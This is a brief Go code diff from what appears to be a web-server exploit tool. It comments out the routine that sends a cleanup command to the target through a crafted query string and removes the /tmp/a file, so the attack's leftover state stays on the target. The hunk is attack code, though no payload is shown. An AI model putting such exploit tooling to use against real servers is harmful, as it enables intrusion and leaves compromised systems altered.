@@ -42,18 +42,18 @@ attackLoop:
 
 	}
 
-	log.Printf("Trying to cleanup /tmp/a...")
-	cleanup := url.Values{"a": []string{cleanupCommand}}
-	for {
-		_, body, err := requester.RequestWithQueryStringPrefix("/", params, cleanup.Encode()+"&")
-		if err != nil {
-			return err
-		}
-		if bytes.Contains(body, []byte(successPattern)) {
-			log.Print("Done!")
-			break
-		}
-	}
+	// log.Printf("Trying to cleanup /tmp/a...")
+	// cleanup := url.Values{"a": []string{cleanupCommand}}
+	// for {
+	// 	_, body, err := requester.RequestWithQueryStringPrefix("/", params, cleanup.Encode()+"&")
+	// 	if err != nil {
+	// 		return err
+	// 	}
+	// 	if bytes.Contains(body, []byte(successPattern)) {
+	// 		log.Print("Done!")
+	// 		break
+	// 	}
+	// }
 	return nil
 }
 
